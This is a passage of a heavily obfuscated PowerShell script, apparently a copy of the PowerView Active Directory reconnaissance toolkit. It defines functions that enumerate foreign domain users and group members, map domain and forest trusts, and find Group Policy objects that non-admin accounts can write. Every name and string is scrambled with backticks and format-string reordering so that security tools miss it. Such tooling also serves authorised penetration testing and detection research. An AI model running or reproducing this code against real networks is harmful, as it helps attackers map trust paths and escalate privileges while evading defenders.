        ${Cr`E`DE`NtIAL} =   (  &("{1}{0}" -f'i','gc') ("{2}{0}{3}{1}" -f'ri',':JH3xo6','va','ablE')  )."vAL`UE"::"eMp`TY"
    )

    PROCESS {
        ${n`etFoReSt`ArG`Ume`NTs} = @{}
        if (${P`sboUNd`paRAmete`RS}[("{1}{0}"-f'st','Fore')]) { ${nETFORE`StARGu`ME`NtS}[("{0}{1}" -f'Fo','rest')] = ${f`OREST} }
        if (${ps`BoUNDP`ArAm`et`eRs}[("{2}{0}{1}"-f'redentia','l','C')]) { ${Netf`or`eS`TargumEntS}[("{1}{0}{2}" -f 'ed','Cr','ential')] = ${C`Re`DENT`iAl} }

        ${FoU`NDfoRe`ST} = &("{1}{0}{2}"-f 'ore','Get-F','st') @NetForestArguments

        if (${fOU`Nd`Fo`REsT}) {
            ${f`OunD`ForeSt}.("{2}{3}{0}{1}{4}{5}"-f 'AllTrustR','elatio','G','et','n','ships').Invoke() | &("{3}{0}{1}{2}"-f 'rE','ach','-Object','Fo') {
                ${_}."PS`oBJEcT"."tyPE`N`AmeS".("{0}{1}{2}"-f'I','nser','t').Invoke(0, ("{3}{4}{2}{0}{1}" -f '.NE','T','estTrust','PowerV','iew.For'))
                ${_}
            }
        }
    }
}


function GEt-D`omAin`F`o`Reign`USeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}" -f'r','PSShouldP','oces','s'}, '')]
    [OutputType({"{1}{2}{3}{4}{0}" -f'r','Pow','erView.','Fo','reignUse'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTIoN = 0, vALUefROMpIPeline = ${T`RUE}, ValuEFRompIPeliNeBYPropERtyNAMe = ${t`RuE})]
        [Alias({"{1}{0}" -f 'ame','N'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`Ain},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'F','er','ilt'})]
        [String]
        ${ld`A`PfIltER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ProPERt`I`es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADS','Path'})]
        [String]
        ${SeArchb`A`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{5}{3}{1}{2}"-f'm','ll','er','tro','Do','ainCon'})]
        [String]
        ${sER`Ver},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{0}" -f'el','OneLev'}, {"{0}{2}{1}" -f 'Subt','ee','r'})]
        [String]
        ${SeARch`S`cope} = ("{0}{1}" -f'Subtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSuLTPa`g`es`IZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRVeRti`MEl`i`Mit},

        [ValidateSet({"{1}{0}" -f 'cl','Da'}, {"{0}{1}"-f 'Gro','up'}, {"{1}{0}" -f 'e','Non'}, {"{0}{1}" -f'Own','er'}, {"{1}{0}" -f 'cl','Sa'})]
        [String]
        ${secUR`i`TYm`AS`KS},

        [Switch]
        ${toMBst`O`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREd`ent`IAL} =  (  &("{0}{1}" -f 'D','Ir')  ('vArI'+'ab'+'Le:jH3'+'xO6'))."vA`lUE"::"eMP`TY"
    )

    BEGIN {
        ${SeArch`ErArGu`meN`Ts} = @{}
        ${s`eArc`HE`RArgumE`Nts}[("{1}{2}{0}" -f 'er','LDAP','Filt')] = ("{0}{2}{1}{3}"-f '(m','ero','emb','f=*)')
        if (${psBOuNd`PA`RaM`ETe`Rs}[("{0}{1}"-f'Dom','ain')]) { ${S`EAR`cH`ErArG`UMEN`Ts}[("{1}{0}" -f 'omain','D')] = ${DoMA`in} }
        if (${PS`BO`Un`dPaRAme`TErS}[("{0}{1}{2}"-f'Pr','opert','ies')]) { ${SearcH`ER`ArgUmen`TS}[("{0}{2}{3}{1}" -f 'Prope','s','r','tie')] = ${p`ROpeRTi`ES} }
        if (${p`SBOUndPa`RA`meTE`Rs}[("{1}{2}{3}{0}" -f'ase','Se','a','rchB')]) { ${SEarC`h`E`RARGUM`e`NtS}[("{1}{2}{0}"-f'chBase','S','ear')] = ${SEAr`chb`A`SE} }
        if (${PSBO`Undpa`R`AM`EteRS}[("{0}{1}"-f 'Serv','er')]) { ${SeArC`H`eR`ARgUm`E`NTS}[("{0}{1}"-f'Serv','er')] = ${sErv`ER} }
        if (${P`s`B`oUNdpaRa`met`ERS}[("{0}{3}{2}{1}" -f'Search','e','cop','S')]) { ${se`ArCH`erA`RGumE`Nts}[("{0}{2}{1}" -f 'Sear','hScope','c')] = ${sea`RcH`s`CoPe} }
        if (${Ps`BOUnDP`A`RAmEt`E`RS}[("{0}{2}{1}"-f 'R','e','esultPageSiz')]) { ${S`Ear`C`H`ERaRg`Uments}[("{2}{3}{0}{1}" -f 'g','eSize','R','esultPa')] = ${rE`sultP`AGes`I`zE} }
        if (${pS`BO`UndParAM`ET`erS}[("{2}{1}{0}{3}" -f'T','ver','Ser','imeLimit')]) { ${sEARcHER`ARgU`meN`TS}[("{0}{4}{3}{1}{2}"-f'Ser','i','t','erTimeLim','v')] = ${SeRVe`RTIMEl`I`MIT} }
        if (${pSbOU`NdPAR`A`Me`T`erS}[("{0}{2}{1}"-f'Sec','sks','urityMa')]) { ${sEa`RCHEraRg`Um`EN`Ts}[("{3}{2}{1}{0}" -f'ks','urityMas','ec','S')] = ${seC`UrITy`m`AS`KS} }
        if (${pSBO`U`NdPaRAm`eT`ers}[("{0}{1}" -f 'T','ombstone')]) { ${SEaR`CHer`A`Rgu`MENTS}[("{2}{0}{1}" -f'bst','one','Tom')] = ${T`OMbSt`ONe} }
        if (${PSB`ouNdPAr`AmEt`ers}[("{2}{1}{0}"-f'ial','dent','Cre')]) { ${SEArcHE`R`Ar`GUmeNts}[("{2}{0}{1}" -f't','ial','Creden')] = ${cR`e`Dent`iAl} }
        if (${p`S`BouNdpar`AmEteRS}['Raw']) { ${SEaRC`hErAR`G`UMEN`TS}['Raw'] = ${r`Aw} }
    }

    PROCESS {
        &("{2}{0}{1}{3}" -f 'et-','DomainUs','G','er') @SearcherArguments  | &("{4}{0}{2}{1}{3}" -f'or','jec','Each-Ob','t','F') {
            ForEach (${Me`mbE`RSH`ip} in ${_}."m`EMb`erof") {
                ${ind`eX} = ${MEm`BERs`H`Ip}.("{0}{1}"-f 'I','ndexOf').Invoke('DC=')
                if (${inD`EX}) {

                    ${groUpD`o`M`AIn} = $(${mem`BE`RsHiP}.("{3}{2}{1}{0}"-f'ng','bStri','u','S').Invoke(${iND`Ex})) -replace 'DC=','' -replace ',','.'
                    ${UsErdiStIn`Gu`I`SHE`DNAME} = ${_}."diS`TINguISHedn`A`mE"
                    ${UseR`I`NDex} = ${U`sE`RdIs`TI`NGUI`sh`EDName}.("{2}{0}{1}" -f 'ndex','Of','I').Invoke('DC=')
                    ${U`sERd`Oma`In} = $(${_}."DisTin`gU`ISHEdN`AME".("{2}{1}{0}{3}" -f'i','tr','SubS','ng').Invoke(${uSEri`ND`Ex})) -replace 'DC=','' -replace ',','.'

                    if (${Gr`O`UPDoM`AiN} -ne ${US`e`R`dOmaiN}) {
                        
                        ${G`ROUp`NAME} = ${mEM`BER`s`Hip}.("{0}{1}"-f 'Spl','it').Invoke(',')[0].("{1}{0}" -f'lit','sp').Invoke('=')[1]
                        ${F`Or`eIgN`User} = &("{0}{2}{1}" -f 'New-','t','Objec') ("{1}{0}{2}" -f 'ec','PSObj','t')
                        ${f`OrEIgN`U`sER} | &("{2}{3}{1}{0}"-f 'ber','em','Add','-M') ("{2}{0}{1}{3}" -f 'o','t','N','eproperty') ("{1}{0}{2}"-f'Doma','User','in') ${USERdo`Ma`in}
                        ${fo`Rei`GNUSER} | &("{1}{0}{2}" -f'd','Ad','-Member') ("{2}{0}{1}"-f'ropert','y','Notep') ("{0}{2}{1}"-f'U','me','serNa') ${_}."SaMa`cCouNT`N`Ame"
                        ${fOreIg`NU`ser} | &("{2}{0}{1}"-f'emb','er','Add-M') ("{0}{1}{2}"-f 'Not','ep','roperty') ("{1}{3}{2}{4}{0}{5}"-f 'dN','UserDis','g','tin','uishe','ame') ${_}."DIs`TInGU`ish`edNAmE"
                        ${foR`E`IGn`UsER} | &("{0}{1}{2}"-f 'Add-','Membe','r') ("{3}{2}{1}{0}" -f 'ty','teproper','o','N') ("{1}{0}{2}"-f 'oupDo','Gr','main') ${g`ROUp`doMain}
                        ${fo`ReiGnU`ser} | &("{0}{1}{2}{3}" -f'A','dd-','M','ember') ("{0}{1}{3}{2}"-f'Note','p','rty','rope') ("{2}{0}{3}{1}" -f'r','e','G','oupNam') ${G`ROup`NAME}
                        ${FOReI`gn`Us`Er} | &("{3}{2}{1}{0}"-f 'ber','-Mem','d','Ad') ("{3}{1}{0}{2}" -f'teprop','o','erty','N') ("{0}{1}{2}{4}{6}{3}{5}" -f 'Group','Dis','t','ui','in','shedName','g') ${MEm`BER`Sh`Ip}
                        ${fO`R`eIG`NUSEr}."p`SOBJEcT"."ty`Pe`NaM`es".("{0}{1}{2}" -f 'I','nse','rt').Invoke(0, ("{0}{6}{3}{5}{2}{1}{4}"-f 'Pow','U','oreign','Vi','ser','ew.F','er'))
                        ${fO`ReiGN`USER}
                    }
                }
            }
        }
    }
}


function GEt-`d`oma`I`NfoREI`gngR`o`UPmEMBer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f'd','P','SShoul','Process'}, '')]
    [OutputType({"{4}{3}{5}{0}{2}{6}{7}{1}" -f'orei','ber','gnG','r','Powe','View.F','rou','pMem'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsiTiOn = 0, VaLuefRoMpiPeLinE = ${Tr`UE}, valUefrompipEliNeByPRoPerTyName = ${TR`Ue})]
        [Alias({"{1}{0}" -f 'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'r','Filt','e'})]
        [String]
        ${ldA`pFIl`T`eR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`opeRT`iES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'AD','SPath'})]
        [String]
        ${S`Earchb`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{4}{3}{2}"-f'omainC','D','ler','ntrol','o'})]
        [String]
        ${Se`R`VER},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{2}{1}"-f'OneLe','l','ve'}, {"{2}{1}{0}" -f'ree','t','Sub'})]
        [String]
        ${Sea`Rc`hsC`OPE} = ("{0}{1}"-f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResU`LTpAG`e`sI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRV`ERTIm`el`IM`It},

        [ValidateSet({"{1}{0}" -f'l','Dac'}, {"{0}{1}"-f 'Grou','p'}, {"{1}{0}"-f 'one','N'}, {"{0}{1}" -f'O','wner'}, {"{0}{1}"-f 'Sa','cl'})]
        [String]
        ${s`ECURI`T`YMaSKS},

        [Switch]
        ${To`mbsTo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReD`E`NTIal} =   ${j`h3X`o6}::"E`Mpty"
    )

    BEGIN {
        ${sEArC`hEr`Ar`GUm`eN`Ts} = @{}
        ${SEaRC`hER`A`Rgu`MeNTs}[("{1}{2}{0}"-f 'ilter','LDA','PF')] = (("{2}{1}{0}"-f 'ber=*)','m','(me'))
        if (${pSbOun`Dp`A`R`AmEtErS}[("{1}{0}" -f'main','Do')]) { ${sEArC`h`ERaR`GuMeNts}[("{0}{1}"-f'Dom','ain')] = ${do`mAin} }
        if (${PsboUnd`PA`Rame`TERS}[("{0}{2}{1}" -f'P','operties','r')]) { ${sEaRChe`Ra`RGU`M`ENts}[("{0}{1}{2}" -f'P','r','operties')] = ${P`RopErTi`eS} }
        if (${PSbO`UndP`ArA`metErs}[("{2}{1}{0}"-f'e','s','SearchBa')]) { ${searcHE`R`ArGume`Nts}[("{0}{2}{1}"-f'Sear','hBase','c')] = ${SE`ARc`Hba`se} }
        if (${p`sB`oUN`d`paRAmE`TERs}[("{1}{0}" -f 'rver','Se')]) { ${sEaR`cher`ArG`U`mEn`Ts}[("{1}{0}"-f 'ver','Ser')] = ${SE`R`Ver} }
        if (${Psb`OuNd`PARA`Me`TErs}[("{0}{3}{2}{1}"-f 'Sear','ope','c','chS')]) { ${s`ea`R`CHerAr`gUMeNts}[("{2}{0}{1}"-f 'hSc','ope','Searc')] = ${SeA`R`ch`sCOpe} }
        if (${pS`BoUNdPArA`met`ErS}[("{1}{2}{0}"-f 'geSize','Result','Pa')]) { ${sE`ARChE`RARGUM`E`NtS}[("{2}{3}{1}{0}" -f'ize','PageS','R','esult')] = ${rEs`UlTPA`g`EsIZe} }
        if (${PSBo`UN`DP`ArAmeteRS}[("{2}{0}{3}{1}" -f'rTi','eLimit','Serve','m')]) { ${s`E`ArCH`ErARgu`meNTs}[("{3}{2}{4}{1}{0}"-f't','i','rTimeL','Serve','im')] = ${Se`R`VerT`i`mElIMIT} }
        if (${p`sbO`U`NDPa`RaM`eTErS}[("{0}{4}{1}{3}{2}"-f'Secu','yMa','ks','s','rit')]) { ${sEArcH`E`R`ArgUM`eNTs}[("{1}{2}{0}{3}"-f 'tyM','Sec','uri','asks')] = ${sEC`Ur`ITY`Ma`SKs} }
        if (${pSbouN`dpa`RAm`ETErS}[("{1}{2}{0}" -f'one','T','ombst')]) { ${S`e`ARc`HeRArGum`EntS}[("{0}{2}{1}"-f'Tombs','ne','to')] = ${tom`BSTO`Ne} }
        if (${Ps`Bo`U`NdpArAMEtERs}[("{1}{0}{2}"-f 're','C','dential')]) { ${seARcHe`RaRgUmE`N`TS}[("{3}{0}{2}{1}" -f 'de','ial','nt','Cre')] = ${cRe`DENt`i`Al} }
        if (${psb`Ou`ND`PaRAm`EtERs}['Raw']) { ${SeArCH`e`RarG`UM`eNTs}['Raw'] = ${r`Aw} }
    }

    PROCESS {
        
        ${ExclU`dE`G`ROups} = @(("{0}{1}"-f 'U','sers'), ("{0}{2}{1}{3}" -f'Domain ','r','Use','s'), ("{1}{0}"-f 'sts','Gue'))

        &("{1}{3}{4}{0}{2}"-f'mai','Ge','nGroup','t','-Do') @SearcherArguments | &("{1}{0}{2}" -f'-Obje','Where','ct') { ${exC`L`UdeGRou`PS} -notcontains ${_}."Sa`Macco`UNt`NAmE" } | &("{2}{1}{0}{3}" -f'j','Each-Ob','For','ect') {
            ${gR`oUp`NAme} = ${_}."sA`maCC`oun`TNAMe"
            ${gr`oUPDi`S`TInGUi`s`HE`D`NaMe} = ${_}."D`is`TIN`G`UISH`EdnAMe"
            ${gr`OUpdo`m`AIn} = ${GRou`p`DiSt`INGu`i`s`HedNAME}.("{0}{2}{1}" -f'S','ing','ubStr').Invoke(${gRo`U`pdIS`TiNgU`iShed`N`A`me}.("{1}{0}" -f 'xOf','Inde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}."mE`M`BeR" | &("{1}{3}{0}{2}" -f'Each-O','Fo','bject','r') {
                
                
                ${meM`BEr`DOM`A`IN} = ${_}.("{1}{2}{0}" -f 'ring','Sub','St').Invoke(${_}.("{1}{2}{0}" -f'f','Index','O').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match ("{4}{0}{1}{2}{3}"-f'S-1-','5-21','.*-.','*','CN=')) -or (${GrOUp`doMa`iN} -ne ${m`e`MbE`R`doMAin})) {
                    ${memB`e`RdistinGuishEd`N`AMe} = ${_}
                    ${mEM`BerNa`me} = ${_}.("{0}{1}" -f 'Spl','it').Invoke(',')[0].("{0}{1}" -f'spl','it').Invoke('=')[1]

                    ${fOR`EIgN`GR`ouPM`EmbeR} = &("{1}{2}{0}{3}" -f 'Objec','New','-','t') ("{1}{0}" -f'bject','PSO')
                    ${f`ORe`IGngRoup`meM`BEr} | &("{2}{0}{1}" -f 'Memb','er','Add-') ("{2}{3}{0}{1}"-f'o','perty','N','otepr') ("{2}{1}{0}"-f 'main','oupDo','Gr') ${gRO`UPdoma`in}
                    ${FoREIgN`Gro`UPm`Em`BEr} | &("{2}{1}{0}"-f'ber','-Mem','Add') ("{0}{2}{1}" -f'Notepro','erty','p') ("{0}{1}{2}"-f 'G','r','oupName') ${G`ROu`P`NaMe}
                    ${fOr`eIGNGrOu`P`MeMBER} | &("{2}{1}{0}"-f 'ber','m','Add-Me') ("{1}{0}{2}"-f'epr','Not','operty') ("{1}{0}{2}{4}{3}"-f's','GroupDi','tingu','edName','ish') ${gRo`UPDisTiNG`Ui`sHE`dNa`Me}
                    ${fOrei`gNgr`OUPm`e`MBer} | &("{0}{1}{2}" -f 'Add-Me','mbe','r') ("{3}{2}{1}{0}"-f'rty','rope','p','Note') ("{0}{1}{3}{2}"-f'Membe','rDo','in','ma') ${MEM`BE`R`dOmaiN}
                    ${f`OreI`g`Ng`RouPME`MbEr} | &("{1}{0}{2}" -f'd-Me','Ad','mber') ("{0}{1}{2}"-f'N','otepr','operty') ("{2}{1}{0}" -f 'Name','er','Memb') ${me`mBE`Rn`AME}
                    ${fo`R`eIGnGrOuPme`mBeR} | &("{0}{2}{1}" -f 'Ad','ember','d-M') ("{0}{1}{2}" -f'Not','epr','operty') ("{5}{3}{4}{2}{1}{0}{6}"-f'dN','ishe','ingu','mb','erDist','Me','ame') ${MeMberdisti`N`g`Ui`S`h`eDnAME}
                    ${FoRe`iGNGR`oUP`MeMBeR}."P`SoBJe`ct"."tYpEN`AM`eS".("{0}{2}{1}"-f 'Ins','rt','e').Invoke(0, ("{1}{0}{3}{5}{4}{6}{2}"-f'rView.Fo','Powe','ber','r','M','eignGroup','em'))
                    ${f`oR`EI`GNgr`Ou`PmembeR}
                }
            }
        }
    }
}


function g`ET`-d`omAINtRU`StmApPi`NG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}" -f 'uldProcess','PS','o','Sh'}, '')]
    [OutputType({"{3}{2}{1}{4}{0}{5}"-f'N','werVi','o','P','ew.DomainTrust.','ET'})]
    [OutputType({"{6}{2}{5}{0}{3}{4}{1}{7}"-f 'erVi','nTrus','o','ew.Dom','ai','w','P','t.LDAP'})]
    [OutputType({"{1}{3}{4}{0}{2}" -f 'us','PowerVi','t.API','ew.Doma','inTr'})]
    [CmdletBinding(DefaultpArAMEteRSETnAME = {"{0}{1}" -f'LDA','P'})]
    Param(
        [Parameter(pAramEtersETnamE = 'API')]
        [Switch]
        ${A`pI},

        [Parameter(PaRAMeTERseTnamE = 'NET')]
        [Switch]
        ${N`eT},

        [Parameter(PaRAmEtErseTnAme = "l`dap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fil','ter'})]
        [String]
        ${lD`APF`iltER},

        [Parameter(pARaMeTERSetNAmE = "l`dap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRo`pe`RtIes},

        [Parameter(ParAmeterseTNAME = "l`dap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'AD','th','SPa'})]
        [String]
        ${searC`Hb`Ase},

        [Parameter(PAraMEtErSEtNamE = "lD`AP")]
        [Parameter(PArAMEtERsETNAmE = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}" -f 'Do','main','C','ontroller'})]
        [String]
        ${S`Er`VER},

        [Parameter(pARAMETerSEtNaME = "ld`AP")]
        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{2}{1}{0}" -f'evel','eL','On'}, {"{2}{1}{0}" -f 'ree','t','Sub'})]
        [String]
        ${SE`Ar`cHscope} = ("{1}{2}{0}" -f'tree','Su','b'),

        [Parameter(PARamEtErSeTnAME = "lD`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${Re`S`ULtP`AgES`ize} = 200,

        [Parameter(pArAmETErSEtnaME = "Ld`AP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RVER`TiMELIm`iT},

        [Parameter(pARAmeteRSETName = "l`Dap")]
        [Switch]
        ${to`mbst`ONe},

        [Parameter(paRAMetErSEtnAme = "Ld`Ap")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cred`en`TIAl} =  ( &("{3}{1}{2}{0}" -f 'm','-chiLd','Ite','gEt') ('VAr'+'iAbLe'+':'+'J'+'H3Xo6') )."V`ALUe"::"EMp`Ty"
    )

    
    ${sE`ENDo`mA`iNS} = @{}

    
    ${D`OM`AinS} = &("{0}{2}{1}" -f 'N','bject','ew-O') ("{2}{4}{3}{0}{1}{5}{6}"-f'lect','ions','S','em.Col','yst','.St','ack')

    ${DomAiNTrus`TarG`U`Me`N`Ts} = @{}
    if (${psbou`N`dP`AraMETeRs}['API']) { ${DO`MainTru`st`ARG`U`MeNts}['API'] = ${A`Pi} }
    if (${P`SB`Oun`DPar`AMEtE`RS}['NET']) { ${DoMai`N`TrUst`Ar`G`UMeNTs}['NET'] = ${n`Et} }
    if (${PSboUNd`p`AraMe`TErs}[("{0}{1}{2}"-f'LDAP','Filte','r')]) { ${DomAint`Ru`STA`RgU`ments}[("{1}{0}{2}{3}" -f 'Fi','LDAP','l','ter')] = ${l`D`APF`IlTER} }
    if (${psbOund`paRa`M`eters}[("{0}{2}{1}"-f 'Prope','es','rti')]) { ${dOm`AIn`TR`UstaRGumENTs}[("{1}{2}{0}"-f 'es','Prope','rti')] = ${p`R`oP`ErtIeS} }
    if (${ps`BoUnDp`ARAm`ETerS}[("{3}{1}{0}{2}" -f 'B','ch','ase','Sear')]) { ${DOmAIn`T`RUST`A`RguM`Ents}[("{0}{1}{2}"-f'Se','arc','hBase')] = ${Sea`Rchba`se} }
    if (${psB`Ound`P`ARAMEt`ers}[("{0}{1}" -f 'Ser','ver')]) { ${D`omA`i`NT`R`USTArgumeNts}[("{1}{0}{2}"-f'e','Serv','r')] = ${s`ErVeR} }
    if (${P`sB`OUnd`ParaMe`TeRs}[("{1}{3}{0}{2}"-f'hS','Sear','cope','c')]) { ${d`OMaiN`TRuS`Ta`RGUmeNts}[("{3}{2}{1}{0}" -f 'ope','c','S','Search')] = ${sE`AR`ChsCo`PE} }
    if (${psBo`UndP`A`R`AmetErS}[("{3}{1}{0}{2}"-f 'eSiz','ag','e','ResultP')]) { ${d`O`M`Ai`NTRU`sTarGUMeNTs}[("{1}{4}{3}{2}{0}" -f'ize','Resul','geS','a','tP')] = ${re`sU`LtPAG`ESiZE} }
    if (${psBO`UndpARA`me`TErS}[("{3}{1}{0}{2}" -f'i','erverTimeL','mit','S')]) { ${D`oMaINT`RUS`Ta`RGUmEn`TS}[("{3}{1}{2}{0}" -f 'it','verT','imeLim','Ser')] = ${serVeRT`ime`l`Im`iT} }
    if (${psB`OUnDpaRA`m`eT`erS}[("{0}{1}{2}" -f 'Tombs','t','one')]) { ${d`o`MaI`NTruSTa`Rg`UMeN`Ts}[("{2}{0}{1}"-f 'm','bstone','To')] = ${T`Omb`s`ToNE} }
    if (${P`Sb`oUnDP`ARAME`TeRs}[("{0}{1}{2}{3}" -f'C','r','ede','ntial')]) { ${Do`M`A`intRu`STaRgu`M`Ents}[("{2}{1}{0}"-f 'l','redentia','C')] = ${cRedeN`T`iAL} }

    
    if (${ps`B`ouN`D`p`AraMetErs}[("{2}{0}{1}"-f 'a','l','Credenti')]) {
        ${C`U`RREN`T`DomaiN} = (&("{2}{0}{1}{3}"-f'-Do','ma','Get','in') -Credential ${C`ReD`ENTIAl})."Na`mE"
    }
    else {
        ${CUrRenT`d`omain} = (&("{2}{3}{0}{1}"-f'mai','n','G','et-Do'))."n`AME"
    }
    ${doMA`I`NS}.("{0}{1}" -f'P','ush').Invoke(${Cu`Rrentdo`ma`In})

    while(${d`O`mAINs}."Cou`Nt" -ne 0) {

        ${D`Om`AiN} = ${dOM`AinS}.("{1}{0}"-f'op','P').Invoke()

        
        if (${d`O`maiN} -and (${do`maiN}.("{1}{0}" -f'm','Tri').Invoke() -ne '') -and (-not ${SEE`NdoMA`InS}.("{0}{1}{2}"-f 'C','on','tainsKey').Invoke(${d`oMa`In}))) {

            &("{2}{0}{1}" -f 'te','-Verbose','Wri') ('['+'G'+'et-D'+'omainTr'+'ustMappi'+'ng] '+'En'+'umer'+'ating '+'tr'+'u'+'sts '+'f'+'or '+'dom'+'ain'+': '+"'$Domain'")

            
            ${N`UlL} = ${s`eEN`d`omAiNs}.("{0}{1}" -f'Ad','d').Invoke(${do`mAin}, '')

            try {
                
                ${d`O`maiN`Tru`stA`RGuMeNts}[("{2}{1}{0}"-f'n','ai','Dom')] = ${Do`mAiN}
                ${tRUs`Ts} = &("{0}{1}{3}{2}" -f'Get-Domai','nTr','st','u') @DomainTrustArguments

                if (${T`RuSTS} -isnot [System.Array]) {
                    ${t`R`USTS} = @(${Tr`Us`Ts})
                }

                
                if (${Ps`c`mDLet}.PaRAMeTERsetNamE -eq 'NET') {
                    ${foR`es`TTR`UsTargUm`enTS} = @{}
                    if (${PSB`O`UndPa`Ra`Meters}[("{1}{0}"-f 'orest','F')]) { ${fo`ReSTt`RU`S`TA`RguMEnts}[("{1}{0}"-f 'est','For')] = ${F`ORE`St} }
                    if (${PSbo`UnD`pa`R`AmEtERs}[("{2}{1}{0}"-f 'ntial','de','Cre')]) { ${fO`ReST`Tru`staRGumeNTS}[("{3}{0}{1}{2}" -f'ent','ia','l','Cred')] = ${CrE`DEnTi`Al} }
                    ${trUs`TS} += &("{1}{0}{3}{2}" -f 't','Ge','Trust','-Forest') @ForestTrustArguments
                }

                if (${tRu`s`TS}) {
                    if (${tRU`sTs} -isnot [System.Array]) {
                        ${T`Ru`STs} = @(${T`R`Usts})
                    }

                    
                    ForEach (${TrU`ST} in ${t`RUsTs}) {
                        if (${T`RUst}."s`oUrcEN`AmE" -and ${Tr`U`ST}."TA`RGEt`N`AmE") {
                            
                            ${Nu`ll} = ${doM`Ains}.("{1}{0}"-f'sh','Pu').Invoke(${tr`U`St}."TARG`ETN`AMe")
                            ${tR`Ust}
                        }
                    }
                }
            }
            catch {
                &("{0}{2}{1}{3}"-f'Writ','-V','e','erbose') ('[Ge'+'t-D'+'o'+'mainT'+'r'+'u'+'stMapping]'+' '+'E'+'rror: '+"$_")
            }
        }
    }
}


function get`-GpoD`E`l`Ega`TIOn {


    [CmdletBinding()]
    Param (
        [String]
        ${G`pO`NAme} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${paG`e`SizE} = 200
    )

    ${e`XClu`s`IONS} = @(("{0}{1}" -f 'SYST','EM'),("{0}{1}{3}{2}"-f 'Domain A','dm','ns','i'),("{2}{3}{1}{0}" -f 'ns','rise Admi','Enter','p'))

    ${FO`REsT} =   ${g0NS}::("{5}{1}{4}{2}{3}{0}"-f 't','t','F','ores','Current','Ge').Invoke()
    ${d`OmA`iNLI`sT} = @(${f`or`EST}."d`Omai`Ns")
    ${DOm`AI`Ns} = ${doM`AINL`Ist} | &("{1}{0}{2}"-f'eac','for','h') { ${_}.("{1}{3}{2}{0}" -f'oryEntry','Get','rect','Di').Invoke() }
    foreach (${D`o`mAiN} in ${domA`INS}) {
        ${fI`lTeR} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${S`E`Arc`HER} = &("{2}{1}{0}"-f 'ct','-Obje','New') ("{3}{4}{5}{2}{1}{0}{6}"-f'orySe','t','c','System.Directory','Services','.Dire','archer')
        ${sEar`chER}."SeA`Rc`HrOOT" = ${DO`Ma`in}
        ${sEa`R`ChEr}."Filt`er" = ${FIlT`eR}
        ${SE`Ar`cHeR}."P`A`gESize" = ${Pa`GesI`zE}
        ${S`E`A`RcHeR}."SEArc`H`sC`oPE" = ("{1}{0}"-f'e','Subtre')
        ${LI`sTg`po} = ${S`EA`RchEr}.("{2}{0}{1}"-f 'Al','l','Find').Invoke()
        foreach (${g`pO} in ${l`istG`Po}){
            ${a`CL} = ([ADSI]${g`Po}."p`AtH")."oB`jECts`ecuri`Ty"."Acc`eSs" | &('?') {${_}."acti`V`EDir`EC`To`RyrighTS" -match ("{0}{1}"-f 'Wri','te') -and ${_}."A`CcESsCo`Ntr`oLtYpe" -eq ("{0}{1}" -f 'Allo','w') -and  ${E`XClUsi`ONS} -notcontains ${_}."IDenTiTyr`Efe`RE`Nce".("{2}{1}{0}"-f 'ing','oStr','t').Invoke().("{1}{0}" -f'it','spl').Invoke("\")[1] -and ${_}."IdeNt`ITy`REFeR`En`Ce" -ne ("{2}{0}{3}{1}"-f'ATOR OWN','R','CRE','E')}
        if (${A`Cl} -ne ${Nu`ll}){
            ${gp`o`ACL} = &("{2}{0}{1}{3}" -f'-Obj','ec','New','t') ("{0}{2}{1}" -f'p','ject','sob')
            ${G`poAcl} | &("{1}{2}{0}{3}" -f'mbe','Add-M','e','r') ("{2}{1}{0}{3}"-f'pe','o','Notepr','rty') ("{2}{0}{1}" -f 'SP','ath','AD') ${g`pO}."pROP`E`RtieS"."aD`s`paTH"
            ${gP`oacl} | &("{1}{2}{0}"-f 'er','Add-','Memb') ("{2}{0}{3}{1}" -f'tepro','rty','No','pe') ("{0}{4}{1}{3}{2}" -f'G','isp','ame','layN','POD') ${g`PO}."PropEr`TI`es"."di`SPL`A`YnaME"
            ${gpoa`CL} | &("{0}{1}{2}" -f 'Add-M','emb','er') ("{0}{3}{2}{1}"-f'Note','ty','oper','pr') ("{4}{2}{1}{0}{3}"-f'e','tyRefer','denti','nce','I') ${a`cl}."IdENTITy`RE`F`E`ReNcE"
